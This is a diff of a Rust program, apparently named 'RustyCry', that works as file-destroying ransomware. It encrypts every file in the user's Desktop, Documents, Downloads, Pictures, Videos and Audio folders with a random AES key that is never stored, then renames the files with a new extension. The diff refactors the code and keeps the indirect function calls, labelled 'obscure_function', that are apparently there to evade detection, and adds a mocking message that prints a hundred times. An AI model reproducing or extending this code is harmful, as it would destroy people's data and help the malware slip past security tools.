@@ -8,69 +8,84 @@ use std::fs::{self, File};
 use std::io::{Read, Write};
 use std::path::PathBuf;
 use std::convert::TryInto;
+use dirs::{desktop_dir, document_dir, download_dir, picture_dir, video_dir, audio_dir};
 type EncCbc = Cbc<Aes256, Pkcs7>;
-type GenKeyIvFn = fn() -> ([u8; 32], [u8; 16]);
-type EncFileFn = fn(&PathBuf, &[u8; 32], &[u8; 16]) -> std::io::Result<()>;
 
-fn gen_key_iv() -> ([u8; 32], [u8; 16]) {
+fn entrypt() {
+    let (key, iv) = keyiv();
+    let common_dirs = vec![
+        desktop_dir(),
+        document_dir(),
+        download_dir(),
+        picture_dir(),
+        video_dir(),
+        audio_dir(),
+    ];
+    for dir in common_dirs {
+        if let Some(path) = dir {
+            stomp(key, iv, path);
+        }
+    }
+    for _ in 0..100 {
+        println!("REST IN PEACE: YOUR FILE SYSTEM - YOURS FAITHFULLY, RUSTYCRY");
+    }
+    println!("\nPress Enter to exit...");
+    let mut input = String::new();
+    std::io::stdin().read_line(&mut input).unwrap();
+}
+fn keyiv() -> ([u8; 32], [u8; 16]) {
+    let generate_iv: fn() -> ([u8; 32], [u8; 16]) = genkeyiv;
+    generate_iv()
+}
+fn genkeyiv() -> ([u8; 32], [u8; 16]) {
     let rng = thread_rng();
     let key: [u8; 32] = rng.sample_iter(&Standard).take(32).collect::<Vec<u8>>().try_into().unwrap();
     let iv: [u8; 16] = thread_rng().sample_iter(&Standard).take(16).collect::<Vec<u8>>().try_into().unwrap();
     (key, iv)
 }
-fn rfc(path: &PathBuf) -> std::io::Result<Vec<u8>> {
-    let mut file_content = Vec::new();
-    let mut file = File::open(&path)?;
-    file.read_to_end(&mut file_content)?;
-    Ok(file_content)
+fn stomp(key: [u8; 32], iv: [u8; 16], start_dir: PathBuf) {
+    for entry in WalkDir::new(start_dir) {
+        let entry = entry.unwrap();
+        if entry.file_type().is_file() {
+            let path = entry.path().to_path_buf();
+            encf(&path, &key, &iv);
+        }
+    }
 }
-fn wfc(path: &PathBuf, content: &[u8]) -> std::io::Result<()> {
+fn encf(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) {
+    let obscure_function: fn(&PathBuf, &[u8; 32], &[u8; 16]) = encf2;
+    obscure_function(path, key, iv)
+}
+fn encf2(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) {
+    match try_encf2(path, key, iv) {
+        Ok(_) => println!("Successfully encrypted: {:?}", path),
+        Err(e) => println!("Failed to encrypt {:?}: {}", path, e),
+    }
+}
+fn try_encf2(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
+    let content = readcon(path)?;
+    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
+    let encrypted_data = cipher.encrypt_vec(&content);
+    writecon(path, &encrypted_data)?;
+    renamef(path)?;
+    Ok(())
+}
+fn readcon(path: &PathBuf) -> std::io::Result<Vec<u8>> {
+    let mut file = File::open(&path)?;
+    let mut content = Vec::new();
+    file.read_to_end(&mut content)?;
+    Ok(content)
+}
+fn writecon(path: &PathBuf, content: &[u8]) -> std::io::Result<()> {
     let mut file = File::create(&path)?;
     file.write_all(content)?;
     Ok(())
 }
-
-fn ren_f(path: &PathBuf, new_extension: &str) -> std::io::Result<()> {
-    let new_path = path.with_extension(new_extension);
-    fs::rename(path, new_path)?;
+fn renamef(path: &PathBuf) -> std::io::Result<()> {
+    let new_name = format!("{}.enc", path.to_str().unwrap());
+    fs::rename(path, new_name)?;
     Ok(())
 }
-
-fn enc_f(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
-    let file_content = rfc(path)?;
-    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
-    let ciphertext = cipher.encrypt_vec(&file_content);
-    wfc(path, &ciphertext)?;
-    ren_f(path, "rusty")?;
-    Ok(())
-}
-
-fn main() -> std::io::Result<()> {
-    let home_d = dirs::home_dir().expect("where home?");
-    let dirs_to_enc = vec![
-        home_d.join("Desktop"),
-        home_d.join("Documents"),
-        home_d.join("Downloads"),
-        home_d.join("Pictures"),
-        home_d.join("Videos"),
-    ];
-    
-    let gen_key_iv_fn: GenKeyIvFn = gen_key_iv;
-    let enc_f_fn: EncFileFn = enc_f;
-    let (key, iv) = gen_key_iv_fn();
-    let indirect_walkdir_new = WalkDir::new;
-    let indirect_walkdir_iter = WalkDir::into_iter;
-    let indirect_result_ok = Result::ok;
-    let indirect_is_file = |e: &walkdir::DirEntry| e.file_type().is_file();
-
-    for dir in dirs_to_enc {
-        let walkdir = indirect_walkdir_new(dir);
-        for entry in indirect_walkdir_iter(walkdir)
-            .filter_map(indirect_result_ok)
-            .filter(indirect_is_file) {
-            let path = entry.path().to_path_buf();
-            if let Err(_) = enc_f_fn(&path, &key, &iv) {}
-        }
-    }
-    Ok(())
+fn main() {
+    entrypt();
 }
